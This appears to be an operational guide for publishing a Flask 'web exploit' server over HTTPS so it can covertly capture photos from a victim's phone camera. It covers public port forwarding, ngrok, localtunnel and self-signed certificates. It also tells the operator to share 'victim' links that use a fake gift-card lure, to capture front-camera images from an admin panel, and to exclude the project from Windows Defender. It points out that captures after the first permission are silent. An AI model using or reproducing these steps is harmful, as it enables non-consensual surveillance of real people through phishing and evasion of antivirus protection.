# 🔒 HTTPS SETUP GUIDE - Enable Camera Access

## ❌ Problem: Camera Requires HTTPS

Modern browsers require HTTPS for camera access (except localhost). You have 4 options:

---

## ✅ OPTION 1: VS Code Port Forwarding (RECOMMENDED - EASIEST!)

### Steps:
1. **Start your Flask server:**
   ```bash
   python web_exploit_server.py
   ```

2. **In VS Code:**
   - Look at bottom panel, click "PORTS" tab
   - Find port `5000` in the list
   - Right-click on port 5000
   - Select **"Port Visibility"** → **"Public"**

3. **Copy the forwarded address:**
   - It will look like: `https://xyz-5000.preview.app.github.dev`
   - This is automatic HTTPS! ✅

4. **Share with victim:**
   - Victim URL: `https://xyz-5000.preview.app.github.dev`
   - Admin panel: `https://xyz-5000.preview.app.github.dev/admin`
   - Test page: `https://xyz-5000.preview.app.github.dev/test`

### Pros:
- ✅ No software installation needed
- ✅ Automatic HTTPS
- ✅ Works from anywhere
- ✅ Built into VS Code

### Cons:
- ⚠️ Requires VS Code

---

## ✅ OPTION 2: Accept Self-Signed Certificate on Android

### Steps:
1. **Start HTTPS server:**
   ```bash
   python web_exploit_server_https.py
   ```

2. **On Android phone:**
   - Open Chrome
   - Go to: `https://192.168.100.59:5000`
   - You'll see: **"Your connection is not private"**
   - Click **"Advanced"**
   - Click **"Proceed to 192.168.100.59 (unsafe)"**
   - ✅ Camera will work now!

3. **URLs:**
   - Victim: `https://192.168.100.59:5000`
   - Admin: `https://localhost:5000/admin` (on computer)
   - Test: `https://192.168.100.59:5000/test`

### Pros:
- ✅ Works on local network
- ✅ No external services needed
- ✅ Fast and reliable

### Cons:
- ⚠️ Only works on same WiFi network
- ⚠️ User sees security warning (must click "Proceed")
- ⚠️ Can't access from outside network

---

## ✅ OPTION 3: Manual ngrok Setup

### Steps:
1. **Download ngrok:**
   - Go to: https://ngrok.com/download
   - Download Windows 64-bit version
   - Extract `ngrok.exe` to project folder

2. **Add Windows Defender exception:**
   - Windows Security → Virus & threat protection
   - Manage settings → Exclusions → Add exclusion
   - Add folder exclusion for your project folder

3. **Start Flask server:**
   ```bash
   python web_exploit_server.py
   ```

4. **Start ngrok tunnel:**
   ```bash
   ngrok http 5000
   ```

5. **Copy HTTPS URL:**
   - Look for line: `Forwarding https://abc123.ngrok.io -> http://localhost:5000`
   - Share: `https://abc123.ngrok.io`

### Pros:
- ✅ Works from anywhere on internet
- ✅ Automatic HTTPS
- ✅ Professional tunneling service

### Cons:
- ⚠️ Requires download
- ⚠️ Windows Defender may block it
- ⚠️ Free version has random URLs

---

## ✅ OPTION 4: Localhost Tunnel (Alternative)

### Steps:
1. **Install localtunnel:**
   ```bash
   npm install -g localtunnel
   ```

2. **Start Flask server:**
   ```bash
   python web_exploit_server.py
   ```

3. **Start tunnel:**
   ```bash
   lt --port 5000
   ```

4. **Copy the HTTPS URL shown**

### Pros:
- ✅ Simple and fast
- ✅ Automatic HTTPS
- ✅ No account needed

### Cons:
- ⚠️ Requires Node.js
- ⚠️ Less reliable than ngrok

---

## 🎯 RECOMMENDED SOLUTION:

### **For Local Testing:**
→ Use **Option 2** (Self-signed certificate on Android)
- Just click "Advanced" → "Proceed"
- Camera works immediately
- No extra setup needed

### **For Remote Access / Demonstration:**
→ Use **Option 1** (VS Code Port Forwarding)
- Built into VS Code
- No downloads needed
- Works perfectly

---

## 📱 Testing Camera After HTTPS Setup:

1. **Test page first:**
   ```
   https://YOUR_URL/test
   ```
   - Click "Test Front Camera"
   - Allow camera permission
   - See if photo appears

2. **Full exploit test:**
   ```
   https://YOUR_URL
   ```
   - Click "CLAIM YOUR GIFT CARD"
   - Go to admin panel: `https://YOUR_URL/admin`
   - Select victim session
   - Click "Capture Front Camera"
   - Photo should appear in admin panel!

---

## 🔧 Current Files:

- `web_exploit_server.py` - Regular HTTP server (for VS Code forwarding)
- `web_exploit_server_https.py` - HTTPS server with self-signed cert
- `start_https_server.py` - Auto ngrok (blocked by Windows Defender)

---

## ✅ Quick Start Commands:

### VS Code Port Forwarding:
```bash
python web_exploit_server.py
# Then use VS Code PORTS tab to make port 5000 public
```

### Self-Signed HTTPS:
```bash
python web_exploit_server_https.py
# On phone: https://192.168.100.59:5000
# Click "Advanced" → "Proceed"
```

---

## 💡 Pro Tips:

1. **VS Code forwarding** is the easiest - no configuration needed
2. **Self-signed cert** works great for local network testing
3. After first camera permission, future captures are **silent**
4. Test with `/test` page before using on victim
5. Camera requires user to click "Allow" first time only

---

**Choose the method that works best for you!** 🚀
